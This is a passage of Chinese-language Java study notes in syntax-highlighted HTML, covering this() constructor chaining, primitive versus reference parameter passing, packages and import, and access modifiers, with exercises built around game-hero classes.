punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Hero</span>  h <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 h<span class="token punctuation">.</span><span class="token function">setName1</span><span class="token punctuation">(</span><span class="token string">"teemo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                 h<span class="token punctuation">.</span><span class="token function">setName2</span><span class="token punctuation">(</span><span class="token string">"garen"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>                     h<span class="token punctuation">.</span><span class="token function">setName3</span><span class="token punctuation">(</span><span class="token string">"死歌"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="通过this调用其他的构造方法"><a href="#通过this调用其他的构造方法" class="headerlink" title="通过this调用其他的构造方法"></a>通过this调用其他的构造方法</h4><p>如果要在一个构造方法中，调用另一个构造方法，可以使用this()</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>            <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>            <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>            <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>            <span class="token comment">//带一个参数的构造方法</span>    <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"一个参数的构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>          <span class="token comment">//带两个参数的构造方法</span>    <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">float</span> hp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"两个参数的构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>hp <span class="token operator">=</span> hp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Hero</span> teemo <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token string">"提莫"</span><span class="token punctuation">,</span><span class="token number">383</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>teemo<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="练习-4"><a href="#练习-4" class="headerlink" title="练习"></a>练习</h4><p>参考<a href="https://how2j.cn/k/class-object/class-object-constructor/292.html#step2209">练习-构造方法</a> 设计一个构造方法,但是参数名称不太一样，分别是<br>String name<br>float hp<br>float armor<br>int moveSpeed</p><p>不仅如此，在这个构造方法中，调用这个构造方法</p><p> <code>public Hero(String name,float hp)</code></p><h4 id="答案-4"><a href="#答案-4" class="headerlink" title="答案"></a>答案</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">Hero</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>            <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>            <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>            <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>            <span class="token comment">//带一个参数的构造方法</span>        <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"一个参数的构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>          <span class="token comment">//带两个参数的构造方法</span>    <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">float</span> hp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"两个参数的构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>hp <span class="token operator">=</span> hp<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">=</span>name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>      <span class="token comment">//带三个参数的构造方法</span>    <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">float</span> hp<span class="token punctuation">,</span><span class="token keyword">float</span> armor<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"三个参数的构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>hp <span class="token operator">=</span> hp<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token operator">=</span>name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>armor<span class="token operator">=</span>armor<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>      <span class="token comment">//带四个参数的构造方法</span>    <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">float</span> hp<span class="token punctuation">,</span><span class="token keyword">float</span> armor<span class="token punctuation">,</span><span class="token keyword">int</span> moveSpeed<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>hp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"四个参数的构造方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//        this.hp = hp;</span><span class="token comment">//        this.name=name;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>armor<span class="token operator">=</span>armor<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>moveSpeed<span class="token operator">=</span>moveSpeed<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Hero</span> teemo <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token string">"提莫"</span><span class="token punctuation">,</span><span class="token number">383</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">330</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>teemo<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h3><p>变量有两种类型 基本类型 和类类型</p><p>参数也是变量，所以传参分为<br><strong>基本类型传参</strong><br><strong>类类型传参</strong></p><h4 id="类类型传参"><a href="#类类型传参" class="headerlink" title="类类型传参"></a>类类型传参</h4><p>基本类型传参<br>在方法内，无法修改方法外的基本类型参数</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>            <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>            <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>            <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>         <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token punctuation">&#125;</span>         <span class="token comment">//回血</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">huixue</span><span class="token punctuation">(</span><span class="token keyword">int</span> xp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        hp <span class="token operator">=</span> hp <span class="token operator">+</span> xp<span class="token punctuation">;</span>        <span class="token comment">//回血完毕后，血瓶=0</span>        xp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>          <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">float</span> hp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>hp <span class="token operator">=</span> hp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Hero</span> teemo <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token string">"提莫"</span><span class="token punctuation">,</span><span class="token number">383</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//血瓶，其值是100</span>        <span class="token keyword">int</span> xueping <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>                 <span class="token comment">//提莫通过这个血瓶回血</span>                 teemo<span class="token punctuation">.</span><span class="token function">huixue</span><span class="token punctuation">(</span>xueping<span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>xueping<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="引用与"><a href="#引用与" class="headerlink" title="引用与="></a>引用与=</h4><p>如果一个变量是基本类型<br>比如 int hp = 50;<br>我们就直接管hp叫变量<br>**=表示赋值的意思<strong>。<br>如果一个变量是类类型<br>比如 Hero h = new Hero();<br>我们就管h叫做</strong>引用<strong>。<br>**=不再是赋值的意思</strong><br>**=表示指向的意思**<br>比如 Hero h = new Hero();<br>这句话的意思是<br>引用h，指向一个Hero对象</p><h4 id="类类型传参-1"><a href="#类类型传参-1" class="headerlink" title="类类型传参"></a>类类型传参</h4><p><strong>类类型又叫引用</strong><br>第24行的引用 <strong>teemo</strong>与 第17行的引用<strong>hero</strong>，<strong>是不同的引用</strong><br>通过调用garen.attack(teemo, 100); 使得这<strong>两个引用都指向了同一个对象</strong><br>所以在第18行hero.hp = hero.hp - damage; 就使得该对象的hp值，发生了变化<br>因此第25行，打印该对象的Hp值就是变化后的值</p><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/595.jpg" alt="595" loading="lazy"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>     <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">// 姓名</span>     <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">// 血量</span>     <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">// 护甲</span>     <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">// 移动速度</span>     <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">float</span> hp<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>hp <span class="token operator">=</span> hp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token comment">// 攻击一个英雄，并让他掉damage点血</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token class-name">Hero</span> hero<span class="token punctuation">,</span> <span class="token keyword">int</span> damage<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        hero<span class="token punctuation">.</span>hp <span class="token operator">=</span> hero<span class="token punctuation">.</span>hp <span class="token operator">-</span> damage<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Hero</span> teemo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token string">"提莫"</span><span class="token punctuation">,</span> <span class="token number">383</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Hero</span> garen <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token string">"盖伦"</span><span class="token punctuation">,</span> <span class="token number">616</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        garen<span class="token punctuation">.</span><span class="token function">attack</span><span class="token punctuation">(</span>teemo<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>teemo<span class="token punctuation">.</span>hp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="练习-5"><a href="#练习-5" class="headerlink" title="练习"></a>练习</h4><p>在方法中，使参数引用指向一个新的对象</p><p>外面的引用是指向原来的对象？还是新的对象？</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>            <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>            <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>            <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>         <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token punctuation">&#125;</span>         <span class="token keyword">public</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span><span class="token keyword">float</span> hp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>hp <span class="token operator">=</span> hp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token comment">//复活</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">revive</span><span class="token punctuation">(</span><span class="token class-name">Hero</span> h<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        h <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token string">"提莫"</span><span class="token punctuation">,</span><span class="token number">383</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Hero</span> teemo <span class="token operator">=</span>  <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token string">"提莫"</span><span class="token punctuation">,</span><span class="token number">383</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">//受到400伤害，挂了</span>        teemo<span class="token punctuation">.</span>hp <span class="token operator">=</span> teemo<span class="token punctuation">.</span>hp <span class="token operator">-</span> <span class="token number">400</span><span class="token punctuation">;</span>                 teemo<span class="token punctuation">.</span><span class="token function">revive</span><span class="token punctuation">(</span>teemo<span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">//问题： System.out.println(teemo.hp); 输出多少？ 怎么理解？</span>             <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="答案-5"><a href="#答案-5" class="headerlink" title="答案"></a>答案</h4><h3 id="包"><a href="#包" class="headerlink" title="包"></a>包</h3><p>包: <strong>package</strong></p><p>把比较接近的类，规划在同一个包下</p><h4 id="把比较接近的类，规划在同一个包下"><a href="#把比较接近的类，规划在同一个包下" class="headerlink" title="把比较接近的类，规划在同一个包下"></a>把比较接近的类，规划在同一个包下</h4><p>Hero,ADHero 规划在一个包，叫做charactor（角色）<br>Item,Weapon规划在另一个包下，叫做 property(道具)<br>在最开始的地方声明该类所处于的包名</p><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/600.png" alt="600" loading="lazy"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">charactor</span><span class="token punctuation">;</span> <span class="token comment">//在最开始的地方声明该类所处于的包名</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>            <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>            <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>            <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>     <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="使用其他包下的类，必须import"><a href="#使用其他包下的类，必须import" class="headerlink" title="使用其他包下的类，必须import"></a>使用其他包下的类，必须import</h4><p>使用同一个包下的其他类，直接使用即可<br>但是要使用其他包下的类，必须import</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">charactor</span><span class="token punctuation">;</span> <span class="token comment">//Weapon类在其他包里，使用必须进行import</span><span class="token keyword">import</span> <span class="token namespace">property<span class="token punctuation">.</span></span><span class="token class-name">Weapon</span><span class="token punctuation">;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hero</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> name<span class="token punctuation">;</span> <span class="token comment">//姓名</span>            <span class="token keyword">float</span> hp<span class="token punctuation">;</span> <span class="token comment">//血量</span>            <span class="token keyword">float</span> armor<span class="token punctuation">;</span> <span class="token comment">//护甲</span>            <span class="token keyword">int</span> moveSpeed<span class="token punctuation">;</span> <span class="token comment">//移动速度</span>         <span class="token comment">//装备一把武器</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">equip</span><span class="token punctuation">(</span><span class="token class-name">Weapon</span> w<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="练习-包"><a href="#练习-包" class="headerlink" title="练习-包"></a>练习-包</h4><p>创建一个新的包charactor1,并且让<a href="https://how2j.cn/k/class-object/class-object-overload/291.html#step2206">练习-治疗类</a>：Support 声明在这个包下</p><h4 id="答案-6"><a href="#答案-6" class="headerlink" title="答案"></a>答案</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">charactor1</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">charactor<span class="token punctuation">.</span></span><span class="token class-name">Hero</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Support</span> <span class="token keyword">extends</span> <span class="token class-name">Hero</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Support</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">public</span>  <span class="token keyword">void</span> <span class="token function">heal</span><span class="token punctuation">(</span><span class="token class-name">Support</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">"对自己进行治疗"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">heal</span><span class="token punctuation">(</span><span class="token class-name">Support</span> a<span class="token punctuation">,</span><span class="token class-name">Hero</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">"给英雄"</span><span class="token operator">+</span>b<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">"加血"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">heal</span><span class="token punctuation">(</span><span class="token class-name">Support</span> a<span class="token punctuation">,</span><span class="token class-name">Hero</span> b<span class="token punctuation">,</span><span class="token keyword">float</span> hp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">"给英雄"</span><span class="token operator">+</span>b<span class="token punctuation">.</span>name<span class="token operator">+</span><span class="token string">"加了"</span><span class="token operator">+</span>hp<span class="token operator">+</span><span class="token string">"点血"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Support</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Support</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        a<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"琴女"</span><span class="token punctuation">;</span>        <span class="token class-name">Hero</span> b  <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hero</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        b<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"盖伦"</span><span class="token punctuation">;</span>        a<span class="token punctuation">.</span><span class="token function">heal</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/11/28/java%E5%AD%A6%E4%B9%A0/image-20201213224645785.png" alt="image-20201213224645785" loading="lazy"></p><h3 id="访问修饰符"><a href="#访问修饰符" class="headerlink" title="访问修饰符"></a>访问修饰符</h3><p>成员变量有四种修饰符<br><strong>private</strong> 私有的<br><strong>package</strong>/friendly/default 不写<br><strong>protected</strong> 受保护的<br><strong>public</strong> 公共的</p><p>比如public 表示公共的</p><p><code>public String name;</code></p><p>而maxHP 没有修饰符即代表package/friendly/default</p><p><code>float maxHP</code></p><h4 